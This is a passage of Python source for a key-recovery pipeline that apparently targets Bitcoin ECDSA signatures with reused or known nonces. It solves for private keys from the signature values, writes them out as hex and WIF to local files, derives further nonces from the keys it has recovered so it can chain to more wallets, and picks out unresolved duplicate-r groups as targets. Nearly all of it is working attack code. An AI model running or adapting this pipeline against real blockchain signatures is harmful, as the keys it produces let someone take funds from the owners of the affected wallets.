    is metadata-only; private/WIF material stays in recovered artifacts.
    """
    k_by_r, k_meta = load_recovered_k_map(recovered_k_path)
    report: dict[str, Any] = {
        "enabled": True,
        "input": str(sig_path),
        "recovered_k": str(recovered_k_path),
        "recovered_json": str(recovered_json_path),
        "recovered_txt": str(recovered_txt_path),
        "k_facts": k_meta,
        "rows_seen": 0,
        "rows_with_known_r": 0,
        "candidate_derivations": 0,
        "accepted_new_keys": 0,
        "duplicate_existing_keys": 0,
        "rejected_pubkey_mismatch": 0,
        "rejected_missing_pubkey": 0,
        "bad_rows": 0,
        "max_rows": int(max_rows),
        "known_r_rows_output": str(known_r_rows_path) if known_r_rows_path else "",
        "known_r_rows_written": 0,
        "priv_material": "LOCAL_ARTIFACT_ONLY",
    }
    if not k_by_r:
        report["reason"] = "no_recovered_k_facts"
        report_path.parent.mkdir(parents=True, exist_ok=True)
        report_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
        return report

    existing_privs = load_existing_recovered_privs(recovered_json_path)
    accepted_this_run: set[int] = set()
    recovered_json_path.parent.mkdir(parents=True, exist_ok=True)
    recovered_txt_path.parent.mkdir(parents=True, exist_ok=True)
    known_r_out = None
    if known_r_rows_path:
        known_r_rows_path.parent.mkdir(parents=True, exist_ok=True)
        known_r_out = known_r_rows_path.open("w", encoding="utf-8")

    try:
        with sig_path.open("r", encoding="utf-8", errors="replace") as src, \
            recovered_json_path.open("a", encoding="utf-8") as jout, \
            recovered_txt_path.open("a", encoding="utf-8") as tout:
            for line in src:
                raw = line.strip()
                if not raw:
                    continue
                report["rows_seen"] = int(report["rows_seen"]) + 1
                if max_rows > 0 and int(report["rows_seen"]) > int(max_rows):
                    report["reason"] = "max_rows_reached"
                    break
                try:
                    obj = json.loads(raw)
                    if not isinstance(obj, dict):
                        report["bad_rows"] = int(report["bad_rows"]) + 1
                        continue
                    r = parse_int(obj.get("r"))
                    s = parse_int(obj.get("s"))
                    z_raw = obj.get("z")
                    if z_raw is None:
                        z_raw = obj.get("m")
                    z = parse_int(z_raw)
                    if not (1 <= r < SECP256K1_N and 1 <= s < SECP256K1_N):
                        report["bad_rows"] = int(report["bad_rows"]) + 1
                        continue
                    r_hex = format(r, "064x")
                    candidates_k = k_by_r.get(r_hex)
                    if not candidates_k:
                        continue
                    report["rows_with_known_r"] = int(report["rows_with_known_r"]) + 1
                    if known_r_out is not None:
                        known_r_out.write(raw + "\n")
                        report["known_r_rows_written"] = int(report["known_r_rows_written"]) + 1
                    pubs = {
                        p
                        for p in pubkey_hex_variants(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
                        if p
                    }
                    if not pubs:
                        report["rejected_missing_pubkey"] = int(report["rejected_missing_pubkey"]) + len(candidates_k)
                        continue
                    r_inv = pow(r, -1, SECP256K1_N)
                    for k in candidates_k:
                        report["candidate_derivations"] = int(report["candidate_derivations"]) + 1
                        d = (((s * int(k) - z) % SECP256K1_N) * r_inv) % SECP256K1_N
                        if not (1 <= d < SECP256K1_N):
                            continue
                        match, _reason = _derived_pubkey_matches(d, pubs)
                        if not match:
                            report["rejected_pubkey_mismatch"] = int(report["rejected_pubkey_mismatch"]) + 1
                            continue
                        if d in existing_privs or d in accepted_this_run:
                            report["duplicate_existing_keys"] = int(report["duplicate_existing_keys"]) + 1
                            continue
                        accepted_this_run.add(d)
                        priv_hex = format(d, "064x")
                        pub_variants = derived_pubkey_variants_from_priv(d)
                        pub_compressed = next((p for p in pub_variants if len(p) == 66), "")
                        pub_uncompressed = next((p for p in pub_variants if len(p) == 130), "")
                        rec = {
                            "priv_hex": priv_hex,
                            "wif": wif_from_priv_int(d, compressed=True),
                            "wif_compressed": wif_from_priv_int(d, compressed=True),
                            "wif_uncompressed": wif_from_priv_int(d, compressed=False),
                            "pubkey": pub_compressed or pub_uncompressed,
                            "pubkey_compressed": pub_compressed,
                            "pubkey_uncompressed": pub_uncompressed,
                            "method": "known-k-chain",
                            "source": "recovered_k",
                            "txid": obj.get("txid"),
                            "vin": obj.get("vin", obj.get("input_index")),
                            "r": r_hex,
                        }
                        jout.write(json.dumps(rec, separators=(",", ":")) + "\n")
                        tout.write(
                            f"{priv_hex} {rec['wif_compressed']} {rec['wif_uncompressed']} "
                            f"(known-k-chain)\n"
                        )
                        report["accepted_new_keys"] = int(report["accepted_new_keys"]) + 1
                except Exception:
                    report["bad_rows"] = int(report["bad_rows"]) + 1
    finally:
        if known_r_out is not None:
            known_r_out.close()

    report.setdefault("reason", "ok")
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
    return report


def build_recovery_chain_report(
    *,
    sig_path: Path,
    recovered_json_path: Path,
    recovered_k_path: Path,
    out_path: Path,
) -> dict[str, Any]:
    """Write metadata-only coverage for recovered-key propagation.

    This intentionally never copies private keys or WIF values into the report.
    """
    recovered_pubs: set[str] = set()
    methods: Counter[str] = Counter()
    bad_recovered_rows = 0
    if recovered_json_path.exists():
        with recovered_json_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                try:
                    obj = json.loads(raw)
                except Exception:
                    bad_recovered_rows += 1
                    continue
                if not isinstance(obj, dict):
                    bad_recovered_rows += 1
                    continue
                pub = normalize_pubkey_hex(str(obj.get("pubkey") or obj.get("pubkey_hex") or obj.get("pub") or ""))
                if pub:
                    recovered_pubs.add(pub)
                method = str(obj.get("method") or "unknown")
                methods[method] += 1

    matched_signatures = 0
    matched_unique_r: set[str] = set()
    matched_pub_counts: Counter[str] = Counter()
    if recovered_pubs and sig_path.exists():
        with sig_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                try:
                    obj = json.loads(raw)
                except Exception:
                    continue
                if not isinstance(obj, dict):
                    continue
                pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
                if pub not in recovered_pubs:
                    continue
                matched_signatures += 1
                matched_pub_counts[pub] += 1
                try:
                    matched_unique_r.add(format(parse_int(obj.get("r")), "064x"))
                except Exception:
                    pass

    recovered_k_rows = 0
    recovered_k_r_values: set[str] = set()
    if recovered_k_path.exists():
        with recovered_k_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                recovered_k_rows += 1
                try:
                    obj = json.loads(raw)
                    if isinstance(obj, dict) and obj.get("r") is not None:
                        recovered_k_r_values.add(format(parse_int(obj.get("r")), "064x"))
                except Exception:
                    pass

    payload = {
        "source_sigs": str(sig_path),
        "recovered_keys": str(recovered_json_path),
        "recovered_k": str(recovered_k_path),
        "recovered_pubkeys": len(recovered_pubs),
        "bad_recovered_rows": bad_recovered_rows,
        "methods": dict(methods),
        "matched_signatures_for_recovered_pubkeys": matched_signatures,
        "matched_unique_r_for_recovered_pubkeys": len(matched_unique_r),
        "recovered_k_rows": recovered_k_rows,
        "recovered_k_unique_r": len(recovered_k_r_values),
        "top_recovered_pubkey_signature_counts": [
            {"pubkey_prefix": pub[:20], "signature_count": count}
            for pub, count in matched_pub_counts.most_common(20)
        ],
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def load_recovery_graph_facts(
    recovered_json_path: Path,
    recovered_k_path: Path,
) -> dict[str, Any]:
    """Load graph facts without returning any private/WIF material."""
    recovered_pubs: set[str] = set()
    recovered_r: set[str] = set()
    methods: Counter[str] = Counter()
    bad_recovered_rows = 0

    if recovered_json_path.exists():
        with recovered_json_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                try:
                    obj = json.loads(raw)
                except Exception:
                    bad_recovered_rows += 1
                    continue
                if not isinstance(obj, dict):
                    bad_recovered_rows += 1
                    continue
                pub = normalize_pubkey_hex(str(obj.get("pubkey") or obj.get("pubkey_hex") or obj.get("pub") or ""))
                if pub:
                    try:
                        recovered_pubs.update(pubkey_hex_variants(pub))
                    except Exception:
                        recovered_pubs.add(pub)
                else:
                    for key in ("priv_hex", "priv", "privkey", "private_key", "d", "wif", "wif_compressed", "wif_uncompressed"):
                        if obj.get(key) is None:
                            continue
                        d = parse_priv_candidate(str(obj.get(key)))
                        if d is not None:
                            recovered_pubs.update(derived_pubkey_variants_from_priv(d))
                            break
                if obj.get("r") is not None:
                    try:
                        recovered_r.add(format(parse_int(obj.get("r")), "064x"))
                    except Exception:
                        pass
                methods[str(obj.get("method") or "unknown")] += 1

    recovered_k_rows = 0
    if recovered_k_path.exists():
        with recovered_k_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                recovered_k_rows += 1
                try:
                    obj = json.loads(raw)
                except Exception:
                    continue
                if isinstance(obj, dict) and obj.get("r") is not None:
                    try:
                        recovered_r.add(format(parse_int(obj.get("r")), "064x"))
                    except Exception:
                        pass

    return {
        "recovered_pubs": recovered_pubs,
        "recovered_r": recovered_r,
        "methods": dict(methods),
        "bad_recovered_rows": bad_recovered_rows,
        "recovered_k_rows": recovered_k_rows,
    }


def load_recovered_priv_pub_map(recovered_json_path: Path) -> tuple[dict[str, set[int]], dict[str, Any]]:
    """Load local recovered private scalars keyed by derived SEC pubkey variants.

    Private material is returned only to callers that write local recovery
    artifacts. Reports generated from this helper must remain metadata-only.
    """
    by_pub: dict[str, set[int]] = defaultdict(set)
    rows = 0
    bad_rows = 0
    rows_with_priv = 0
    if not recovered_json_path.exists():
        return by_pub, {
            "exists": False,
            "rows": 0,
            "bad_rows": 0,
            "rows_with_priv": 0,
            "unique_pubkeys": 0,
            "unique_private_scalars": 0,
        }
    with recovered_json_path.open("r", encoding="utf-8", errors="replace") as f:
        for line in f:
            raw = line.strip()
            if not raw:
                continue
            rows += 1
            try:
                obj = json.loads(raw)
            except Exception:
                bad_rows += 1
                continue
            if not isinstance(obj, dict):
                bad_rows += 1
                continue
            d: int | None = None
            for key in ("priv_hex", "priv", "privkey", "private_key", "d", "wif", "wif_compressed", "wif_uncompressed"):
                if obj.get(key) is None:
                    continue
                d = parse_priv_candidate(str(obj.get(key)))
                if d is not None:
                    break
            if d is None:
                continue
            rows_with_priv += 1
            pubs: set[str] = set()
            explicit_pub = normalize_pubkey_hex(str(obj.get("pubkey") or obj.get("pubkey_hex") or obj.get("pub") or ""))
            if explicit_pub:
                pubs.update(pubkey_hex_variants(explicit_pub))
            pubs.update(derived_pubkey_variants_from_priv(d))
            if not pubs:
                bad_rows += 1
                continue
            for pub in pubs:
                by_pub[pub].add(int(d))
    unique_private_scalars = len({d for scalars in by_pub.values() for d in scalars})
    return by_pub, {
        "exists": True,
        "rows": rows,
        "bad_rows": bad_rows,
        "rows_with_priv": rows_with_priv,
        "unique_pubkeys": len(by_pub),
        "unique_private_scalars": unique_private_scalars,
    }


def r_from_k_matches(k: int, r: int) -> bool | None:
    """Return whether k*G produces r. None means validation unavailable."""
    if not (1 <= int(k) < SECP256K1_N and 1 <= int(r) < SECP256K1_N):
        return False
    try:
        from coincurve import PrivateKey  # type: ignore
        pub = PrivateKey(int(k).to_bytes(32, "big")).public_key.format(compressed=False)
        x = int.from_bytes(pub[1:33], "big") % SECP256K1_N
        return x == int(r)
    except Exception:
        return None


def derive_recovered_k_from_known_privs(
    *,
    sig_path: Path,
    recovered_json_path: Path,
    recovered_k_path: Path,
    report_path: Path,
    max_rows: int = 0,
    require_r_validation: bool = True,
) -> dict[str, Any]:
    """Append r->k candidates derived from already recovered private keys.

    For each signature whose pubkey has a local recovered private scalar, compute
    k=s^-1(z+r*d) mod n and append k/n-k only when k*G matches r. This converts
    every confirmed private key into more local nonce facts without exposing
    private or nonce material in the report.
    """
    priv_by_pub, priv_meta = load_recovered_priv_pub_map(recovered_json_path)
    existing_k_by_r, existing_k_meta = load_recovered_k_map(recovered_k_path)
    report: dict[str, Any] = {
        "enabled": True,
        "input": str(sig_path),
        "recovered_json": str(recovered_json_path),
        "recovered_k": str(recovered_k_path),
        "recovered_priv_facts": priv_meta,
        "existing_k_facts": existing_k_meta,
        "rows_seen": 0,
        "rows_matching_recovered_pubkey": 0,
        "candidate_derivations": 0,
        "new_r_groups": 0,
        "new_k_candidates": 0,
        "duplicate_k_candidates": 0,
        "rejected_r_mismatch": 0,
        "rejected_validation_unavailable": 0,
        "bad_rows": 0,
        "max_rows": int(max_rows),
        "require_r_validation": bool(require_r_validation),
        "priv_material": "LOCAL_ARTIFACT_ONLY",
    }
    if not priv_by_pub:
        report["reason"] = "no_recovered_private_keys"
        report_path.parent.mkdir(parents=True, exist_ok=True)
        report_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
        return report

    additions: dict[str, set[int]] = defaultdict(set)
    with sig_path.open("r", encoding="utf-8", errors="replace") as src:
        for line in src:
            raw = line.strip()
            if not raw:
                continue
            report["rows_seen"] = int(report["rows_seen"]) + 1
            if max_rows > 0 and int(report["rows_seen"]) > int(max_rows):
                report["reason"] = "max_rows_reached"
                break
            try:
                obj = json.loads(raw)
                if not isinstance(obj, dict):
                    report["bad_rows"] = int(report["bad_rows"]) + 1
                    continue
                pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or obj.get("pubkey") or ""))
                if not pub:
                    continue
                pubs = pubkey_hex_variants(pub)
                scalars: set[int] = set()
                for p in pubs:
                    scalars.update(priv_by_pub.get(p, set()))
                if not scalars:
                    continue
                report["rows_matching_recovered_pubkey"] = int(report["rows_matching_recovered_pubkey"]) + 1
                r = parse_int(obj.get("r"))
                s = parse_int(obj.get("s"))
                z_raw = obj.get("z")
                if z_raw is None:
                    z_raw = obj.get("m")
                z = parse_int(z_raw)
                if not (1 <= r < SECP256K1_N and 1 <= s < SECP256K1_N):
                    report["bad_rows"] = int(report["bad_rows"]) + 1
                    continue
                s_inv = pow(s, -1, SECP256K1_N)
                r_hex = format(r, "064x")
                existing_for_r = existing_k_by_r.get(r_hex, set())
                for d in scalars:
                    k = (s_inv * ((z + (r * d)) % SECP256K1_N)) % SECP256K1_N
                    if not (1 <= k < SECP256K1_N):
                        continue
                    report["candidate_derivations"] = int(report["candidate_derivations"]) + 1
                    candidates = {k, (-k) % SECP256K1_N}
                    for kc in candidates:
                        if not (1 <= kc < SECP256K1_N):
                            continue
                        match = r_from_k_matches(kc, r)
                        if match is None and require_r_validation:
                            report["rejected_validation_unavailable"] = int(report["rejected_validation_unavailable"]) + 1
                            continue
                        if match is False:
                            report["rejected_r_mismatch"] = int(report["rejected_r_mismatch"]) + 1
                            continue
                        if kc in existing_for_r or kc in additions[r_hex]:
                            report["duplicate_k_candidates"] = int(report["duplicate_k_candidates"]) + 1
                            continue
                        additions[r_hex].add(kc)
            except Exception:
                report["bad_rows"] = int(report["bad_rows"]) + 1

    if additions:
        recovered_k_path.parent.mkdir(parents=True, exist_ok=True)
        with recovered_k_path.open("a", encoding="utf-8") as out:
            for r_hex, ks in sorted(additions.items()):
                out.write(json.dumps({
                    "r": r_hex,
                    "k_candidates": [format(k, "064x") for k in sorted(ks)],
                    "source": "known-priv-chain",
                }, sort_keys=True) + "\n")
        report["new_r_groups"] = len(additions)
        report["new_k_candidates"] = sum(len(v) for v in additions.values())
        report["reason"] = "ok"
    else:
        report["reason"] = "no_new_k_candidates"

    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
    return report


def build_recovery_graph_focus_subset(
    *,
    sig_path: Path,
    recovered_json_path: Path,
    recovered_k_path: Path,
    out_path: Path,
    report_path: Path,
) -> dict[str, Any]:
    """Select rows connected to known local recovered facts.

    Rows are included when either:
    - their pubkey already has a locally recovered private key; or
    - their r has a locally recovered k candidate.

    The report is metadata-only and intentionally omits private/WIF/k values.
    """
    facts = load_recovery_graph_facts(recovered_json_path, recovered_k_path)
    recovered_pubs: set[str] = facts["recovered_pubs"]
    recovered_r: set[str] = facts["recovered_r"]

    total_rows = 0
    selected_rows = 0
    by_pub_rows = 0
    by_r_rows = 0
    both_rows = 0
    bad_json_rows = 0
    selected_unique_pub: set[str] = set()
    selected_unique_r: set[str] = set()

    out_path.parent.mkdir(parents=True, exist_ok=True)
    with sig_path.open("r", encoding="utf-8", errors="replace") as src, out_path.open("w", encoding="utf-8") as out:
        for line in src:
            raw = line.strip()
            if not raw:
                continue
            total_rows += 1
            try:
                obj = json.loads(raw)
            except Exception:
                bad_json_rows += 1
                continue
            if not isinstance(obj, dict):
                bad_json_rows += 1
                continue

            pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
            r_hex = ""
            try:
                r_hex = format(parse_int(obj.get("r")), "064x")
            except Exception:
                pass

            pub_hit = bool(pub and pub in recovered_pubs)
            r_hit = bool(r_hex and r_hex in recovered_r)
            if not (pub_hit or r_hit):
                continue

            out.write(raw + "\n")
            selected_rows += 1
            by_pub_rows += int(pub_hit)
            by_r_rows += int(r_hit)
            both_rows += int(pub_hit and r_hit)
            if pub:
                selected_unique_pub.add(pub)
            if r_hex:
                selected_unique_r.add(r_hex)

    payload = {
        "source_sigs": str(sig_path),
        "output": str(out_path),
        "recovered_keys": str(recovered_json_path),
        "recovered_k": str(recovered_k_path),
        "total_rows": total_rows,
        "selected_rows": selected_rows,
        "selected_by_pubkey_rows": by_pub_rows,
        "selected_by_recovered_r_rows": by_r_rows,
        "selected_by_both_rows": both_rows,
        "selected_unique_pubkeys": len(selected_unique_pub),
        "selected_unique_r": len(selected_unique_r),
        "known_recovered_pubkeys": len(recovered_pubs),
        "known_recovered_r": len(recovered_r),
        "recovered_methods": facts["methods"],
        "recovered_k_rows": facts["recovered_k_rows"],
        "bad_json_rows": bad_json_rows,
        "bad_recovered_rows": facts["bad_recovered_rows"],
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def build_recovery_graph_expansion_report(
    *,
    graph_subset_path: Path,
    recovered_json_path: Path,
    recovered_k_path: Path,
    pre_validation: dict[str, Any],
    post_validation: dict[str, Any],
    out_path: Path,
) -> dict[str, Any]:
    """Classify graph-selected rows and explain expansion blockers.

    This report is intentionally metadata-only: it never includes private keys,
    WIF values, raw k values, full pubkeys, or full r values.
    """
    facts = load_recovery_graph_facts(recovered_json_path, recovered_k_path)
    recovered_pubs: set[str] = facts["recovered_pubs"]
    recovered_r: set[str] = facts["recovered_r"]

    rows = 0
    bad_json_rows = 0
    selected_by_pub_only = 0
    selected_by_r_only = 0
    selected_by_both = 0
    known_k_should_derive_new_d_rows = 0
    same_r_multi_pub_groups = 0
    same_r_diff_s_groups = 0
    same_r_diff_z_groups = 0
    rows_missing_pubkey = 0
    rows_missing_or_bad_r = 0
    rows_with_bad_s_or_z = 0
    r_groups: dict[str, dict[str, Any]] = {}

    if graph_subset_path.exists():
        with graph_subset_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                rows += 1
                try:
                    obj = json.loads(raw)
                except Exception:
                    bad_json_rows += 1
                    continue
                if not isinstance(obj, dict):
                    bad_json_rows += 1
                    continue

                pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
                if not pub:
                    rows_missing_pubkey += 1

                r_hex = ""
                try:
                    r_hex = format(parse_int(obj.get("r")), "064x")
                except Exception:
                    rows_missing_or_bad_r += 1

                s_hex = ""
                z_hex = ""
                try:
                    s_hex = format(parse_int(obj.get("s")), "064x")
                    z_raw = obj.get("z")
                    if z_raw is None:
                        z_raw = obj.get("m")
                    z_hex = format(parse_int(z_raw), "064x")
                except Exception:
                    rows_with_bad_s_or_z += 1

                pub_hit = bool(pub and pub in recovered_pubs)
                r_hit = bool(r_hex and r_hex in recovered_r)
                if pub_hit and r_hit:
                    selected_by_both += 1
                elif pub_hit:
                    selected_by_pub_only += 1
                elif r_hit:
                    selected_by_r_only += 1

                # A recovered k for an unrecovered pubkey is the key-expansion
                # opportunity. If no new key appears after chain stage, likely
                # blockers are z mismatch, pubkey mismatch, or bad source data.
                if r_hit and pub and pub not in recovered_pubs:
                    known_k_should_derive_new_d_rows += 1

                if r_hex:
                    g = r_groups.setdefault(
                        r_hex,
                        {"pubs": set(), "s": set(), "z": set(), "rows": 0, "recovered_r": r_hex in recovered_r},
                    )
                    g["rows"] += 1
                    if pub:
                        g["pubs"].add(pub)
                    if s_hex:
                        g["s"].add(s_hex)
                    if z_hex:
                        g["z"].add(z_hex)

    top_groups = []
    for r_hex, g in r_groups.items():
        pub_count = len(g["pubs"])
        s_count = len(g["s"])
        z_count = len(g["z"])
        if pub_count > 1:
            same_r_multi_pub_groups += 1
        if s_count > 1:
            same_r_diff_s_groups += 1
        if z_count > 1:
            same_r_diff_z_groups += 1
        top_groups.append(
            {
                "r_prefix": r_hex[:16],
                "rows": g["rows"],
                "unique_pubkeys": pub_count,
                "unique_s": s_count,
                "unique_z": z_count,
                "has_recovered_k": bool(g["recovered_r"]),
            }
        )

    top_groups.sort(
        key=lambda x: (
            int(x["has_recovered_k"]),
            int(x["unique_pubkeys"]),
            int(x["unique_s"]),
            int(x["unique_z"]),
            int(x["rows"]),
        ),
        reverse=True,
    )

    pre_valid = int(pre_validation.get("valid_rows", 0) or 0)
    post_valid = int(post_validation.get("valid_rows", 0) or 0)
    new_valid = max(0, post_valid - pre_valid)
    likely_blockers = []
    if known_k_should_derive_new_d_rows > 0 and new_valid == 0:
        likely_blockers.append("known_k_rows_did_not_validate_new_pubkeys")
    if rows_with_bad_s_or_z > 0:
        likely_blockers.append("bad_or_missing_s_z_in_graph_subset")
    if rows_missing_pubkey > 0:
        likely_blockers.append("missing_pubkey_blocks_strict_validation")
    if same_r_multi_pub_groups > 0 and new_valid == 0:
        likely_blockers.append("cross_pub_same_r_present_but_no_valid_new_d")

    payload = {
        "graph_subset": str(graph_subset_path),
        "rows": rows,
        "bad_json_rows": bad_json_rows,
        "selected_by_pubkey_only_rows": selected_by_pub_only,
        "selected_by_recovered_r_only_rows": selected_by_r_only,
        "selected_by_both_rows": selected_by_both,
        "known_k_should_derive_new_d_rows": known_k_should_derive_new_d_rows,
        "same_r_multi_pub_groups": same_r_multi_pub_groups,
        "same_r_diff_s_groups": same_r_diff_s_groups,
        "same_r_diff_z_groups": same_r_diff_z_groups,
        "rows_missing_pubkey": rows_missing_pubkey,
        "rows_missing_or_bad_r": rows_missing_or_bad_r,
        "rows_with_bad_s_or_z": rows_with_bad_s_or_z,
        "pre_valid_recovered_rows": pre_valid,
        "post_valid_recovered_rows": post_valid,
        "new_valid_rows_from_graph_stage": new_valid,
        "likely_blockers": likely_blockers,
        "top_r_groups": top_groups[:50],
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def build_unresolved_recovery_targets_subset(
    *,
    sig_path: Path,
    recovered_json_path: Path,
    recovered_k_path: Path,
    out_path: Path,
    report_path: Path,
) -> dict[str, Any]:
    """Select duplicate-r evidence not already explained by local recovered facts.

    This is a compute-routing filter. It does not delete evidence; it writes a
    focused JSONL subset for expensive stages and a metadata-only report.
    """
    facts = load_recovery_graph_facts(recovered_json_path, recovered_k_path)
    recovered_pubs: set[str] = facts["recovered_pubs"]
    recovered_r: set[str] = facts["recovered_r"]

    groups: dict[str, dict[str, Any]] = {}
    total_rows = 0
    bad_json_rows = 0
    rows_missing_r = 0
    rows_missing_pubkey = 0

    if sig_path.exists():
        with sig_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                total_rows += 1
                try:
                    obj = json.loads(raw)
                except Exception:
                    bad_json_rows += 1
                    continue
                if not isinstance(obj, dict):
                    bad_json_rows += 1
                    continue

                try:
                    r_hex = format(parse_int(obj.get("r")), "064x")
                except Exception:
                    rows_missing_r += 1
                    continue
                pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
                if not pub:
                    rows_missing_pubkey += 1

                s_hex = ""
                z_hex = ""
                try:
                    s_hex = format(parse_int(obj.get("s")), "064x")
                except Exception:
                    pass
                try:
                    z_raw = obj.get("z")
                    if z_raw is None:
                        z_raw = obj.get("m")
                    z_hex = format(parse_int(z_raw), "064x")
                except Exception:
                    pass

                g = groups.setdefault(
                    r_hex,
                    {
                        "rows": 0,
                        "pubs": set(),
                        "s": set(),
                        "z": set(),
                        "known_pub_rows": 0,
                        "unknown_pub_rows": 0,
                        "known_r": r_hex in recovered_r,
                    },
                )
                g["rows"] += 1
                if pub:
                    g["pubs"].add(pub)
                    if pub in recovered_pubs:
                        g["known_pub_rows"] += 1
                    else:
                        g["unknown_pub_rows"] += 1
                if s_hex:
                    g["s"].add(s_hex)
                if z_hex:
                    g["z"].add(z_hex)

    selected_r: set[str] = set()
    duplicate_r_groups = 0
    explained_duplicate_r_groups = 0
    unresolved_duplicate_r_groups = 0
    cross_pub_unresolved_groups = 0
    same_r_diff_s_unresolved_groups = 0
    same_r_diff_z_unresolved_groups = 0
    known_r_unrecovered_pub_groups = 0
    replay_like_groups = 0
    top_groups: list[dict[str, Any]] = []

    for r_hex, g in groups.items():
        if int(g["rows"]) < 2:
            continue
        duplicate_r_groups += 1
        unique_pubs = len(g["pubs"])
        unique_s = len(g["s"])
        unique_z = len(g["z"])
        known_r = bool(g["known_r"])
        unknown_pub_rows = int(g["unknown_pub_rows"])
        cross_pub = unique_pubs > 1
        same_r_diff_s = unique_s > 1
        same_r_diff_z = unique_z > 1
        exact_replay_like = not cross_pub and not same_r_diff_s and not same_r_diff_z

        # A duplicate-r group is "explained" only when there is no remaining
        # algebraic signal or every row is already attached to local facts.
        unresolved = False
        reasons: list[str] = []
        if cross_pub and unknown_pub_rows > 0:
            unresolved = True
            reasons.append("cross_pub_unrecovered")
        if same_r_diff_s and not known_r:
            unresolved = True
            reasons.append("same_r_diff_s_without_known_k")
        if same_r_diff_z and not known_r:
            unresolved = True
            reasons.append("same_r_diff_z_without_known_k")
        if known_r and unknown_pub_rows > 0:
            unresolved = True
            reasons.append("known_k_unrecovered_pub_followup")
        if exact_replay_like:
            replay_like_groups += 1

        if unresolved:
            selected_r.add(r_hex)
            unresolved_duplicate_r_groups += 1
            cross_pub_unresolved_groups += int(cross_pub)
            same_r_diff_s_unresolved_groups += int(same_r_diff_s)
            same_r_diff_z_unresolved_groups += int(same_r_diff_z)
            known_r_unrecovered_pub_groups += int(known_r and unknown_pub_rows > 0)
        else:
            explained_duplicate_r_groups += 1
            reasons.append("explained_or_replay_like")

        if unresolved or len(top_groups) < 50:
            top_groups.append(
                {
                    "r_prefix": r_hex[:16],
                    "rows": int(g["rows"]),
                    "unique_pubkeys": unique_pubs,
                    "unique_s": unique_s,
                    "unique_z": unique_z,
                    "has_recovered_k": known_r,
                    "known_pub_rows": int(g["known_pub_rows"]),
                    "unknown_pub_rows": unknown_pub_rows,
                    "selected": unresolved,
                    "reasons": reasons[:6],
                }
            )

    selected_rows = 0
    selected_unique_pubkeys: set[str] = set()
    selected_known_r_rows = 0
    selected_known_pub_rows = 0
    skipped_known_r_rows = 0
    skipped_known_pub_rows = 0

    out_path.parent.mkdir(parents=True, exist_ok=True)
    with sig_path.open("r", encoding="utf-8", errors="replace") as src, out_path.open("w", encoding="utf-8") as out:
        for line in src:
            raw = line.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
                if not isinstance(obj, dict):
                    continue
                r_hex = format(parse_int(obj.get("r")), "064x")
            except Exception:
                continue
            pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
            r_hit = r_hex in recovered_r
            pub_hit = bool(pub and pub in recovered_pubs)
            if r_hex not in selected_r:
                skipped_known_r_rows += int(r_hit)
                skipped_known_pub_rows += int(pub_hit)
                continue
            out.write(raw + "\n")
            selected_rows += 1
            selected_known_r_rows += int(r_hit)
            selected_known_pub_rows += int(pub_hit)
            if pub:
                selected_unique_pubkeys.add(pub)

    top_groups.sort(
        key=lambda x: (
            int(bool(x["selected"])),
            int(x["unknown_pub_rows"]),
            int(x["unique_pubkeys"]),
            int(x["unique_s"]),
            int(x["unique_z"]),
            int(x["rows"]),
        ),
        reverse=True,
    )
    payload = {
        "source_sigs": str(sig_path),
        "output": str(out_path),
        "total_rows": total_rows,
        "bad_json_rows": bad_json_rows,
        "rows_missing_r": rows_missing_r,
        "rows_missing_pubkey": rows_missing_pubkey,
        "known_recovered_pubkeys": len(recovered_pubs),
        "known_recovered_r": len(recovered_r),
        "duplicate_r_groups": duplicate_r_groups,
        "explained_duplicate_r_groups": explained_duplicate_r_groups,
        "unresolved_duplicate_r_groups": unresolved_duplicate_r_groups,
        "replay_like_groups": replay_like_groups,
        "cross_pub_unresolved_groups": cross_pub_unresolved_groups,
        "same_r_diff_s_unresolved_groups": same_r_diff_s_unresolved_groups,
        "same_r_diff_z_unresolved_groups": same_r_diff_z_unresolved_groups,
        "known_r_unrecovered_pub_groups": known_r_unrecovered_pub_groups,
        "selected_rows": selected_rows,
        "selected_unique_r": len(selected_r),
        "selected_unique_pubkeys": len(selected_unique_pubkeys),
        "selected_known_r_rows": selected_known_r_rows,
        "selected_known_pub_rows": selected_known_pub_rows,
        "skipped_known_r_rows": skipped_known_r_rows,
        "skipped_known_pub_rows": skipped_known_pub_rows,
        "top_groups": top_groups[:50],
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    report_path.parent.mkdir(parents=True, exist_ok=True)
